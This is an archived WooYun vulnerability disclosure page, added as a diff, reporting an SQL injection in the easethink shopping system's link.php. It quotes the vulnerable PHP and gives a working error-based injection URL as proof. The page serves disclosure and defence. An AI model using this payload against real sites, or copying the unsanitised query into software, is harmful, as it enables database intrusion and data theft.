@@ -1,0 +1,183 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		意想购物（easethink）SQL注射漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		意想购物（easethink）SQL注射漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lxsec">lxsec</a> 
+</li><li>提交时间：		2013-04-16 17:39</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-16：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-07-15：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">意想购物存在sql注入漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">本来是写今天的那个易想购物sql注入漏洞的，找一些request变量看看。发现link页貌似也有过滤不严的错误，就打开代码看看先，果然发现问题了。<br />
+<br />
+下面是link.php页面内代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>if($_REQUEST[&#039;act&#039;]==&#039;go&#039;)  //link标签 go<br />
+{<br />
+	$url = ($_REQUEST[&#039;url&#039;]);  //直接取了url的值就带入了sql查询语句了<br />
+	$link_item = $GLOBALS[&#039;db&#039;]-&gt;getRowCached(&quot;select * from &quot;.DB_PREFIX.&quot;link where (url = &#039;&quot;.$url.&quot;&#039; or url = &#039;http://&quot;.$url.&quot;&#039;) and is_effect = 1&quot;); //带入查询了<br />
+	if($link_item)<br />
+	{<br />
+		if(check_ipop_limit(get_client_ip(),&quot;Link&quot;,10,$link_item[&#039;id&#039;]))<br />
+		$GLOBALS[&#039;db&#039;]-&gt;query(&quot;update &quot;.DB_PREFIX.&quot;link set count = count + 1 where id = &quot;.$link_item[&#039;id&#039;]);<br />
+		$url = &quot;http://&quot;.$url;<br />
+	}<br />
+	else<br />
+	{<br />
+		$url = APP_ROOT.&quot;/&quot;;<br />
+	}<br />
+	app_redirect($url);<br />
+}</code></pre><p class='detail'><br />
+<br />
+看的很清楚吧 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">试试<br />
+<br />
+<br />
+<br />
+localhost/exptest/easethink/link.php?act=go&amp;city=sanming&amp;url=&#039;and(select%201%20from(select%20count(*)%2cconcat((select%20concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(68)%2cCHAR(98)%2cCHAR(104)%2cCHAR(67)%2cCHAR(77)%2cCHAR(99)%2cCHAR(77)%2cCHAR(81))%20from%20information_schema.tables%20limit%200%2c1)%2cfloor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/161730206d7bf9ecfcc4189d856e217189b8a6f7.jpg" target="_blank"><img src="../images/161730206d7bf9ecfcc4189d856e217189b8a6f7.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对于关键字的过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lxsec" title="lxsec">lxsec</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021971" title="意想购物（easethink）SQL注射漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：13 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21971";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
